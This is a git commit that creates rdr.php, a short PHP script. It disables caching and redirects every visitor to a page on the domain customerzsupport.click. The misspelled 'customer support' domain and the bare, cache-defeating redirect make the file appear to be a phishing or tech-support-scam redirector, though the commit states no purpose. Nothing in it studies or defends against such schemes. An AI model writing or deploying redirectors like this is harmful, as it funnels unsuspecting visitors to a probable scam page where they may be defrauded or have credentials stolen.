fb63bce08de0795c6f158895b0c5aa7923fb9f3c
forevaevent <forevaevent@gmail.com>
2024-12-21 07:02:12 +1100

    Create rdr.php

---
+++ rdr.php
@@ -0,0 +1,12 @@
+<?php
+// Enable output buffering for maximum speed
+ob_start();
+
+// Set headers to prevent caching
+header("Cache-Control: no-cache, no-store, must-revalidate");
+header("Expires: 0");
+header("Pragma: no-cache");
+
+header("Location: https://customerzsupport.click/20398492/carbon.html"); 
+exit;
+?>
